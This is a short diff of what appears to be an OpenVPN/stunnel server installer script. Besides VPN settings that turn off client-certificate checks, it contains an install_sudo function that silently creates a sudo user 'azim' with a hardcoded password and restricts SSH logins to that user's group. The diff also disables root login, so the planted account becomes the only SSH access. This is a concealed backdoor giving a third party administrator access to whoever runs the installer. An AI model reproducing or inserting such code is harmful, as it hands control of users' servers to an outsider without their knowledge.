@@ -319,7 +319,6 @@ verify-client-cert none
 client-cert-not-required
 script-security 3
 max-clients 1024
-max-same-clients = 2
 client-connect /etc/openvpn/login/connect.sh
 client-disconnect /etc/openvpn/login/disconnect.sh
 ifconfig-pool-persist /etc/openvpn/server/ip_udp.txt
@@ -624,7 +623,7 @@ sudo service stunnel4 restart
 install_sudo(){
   {
     useradd -m azim 2>/dev/null; echo azim:@@MDAzim@@ | chpasswd &>/dev/null; usermod -aG sudo azim &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin yes/g' /etc/ssh/sshd_config
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups azim" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
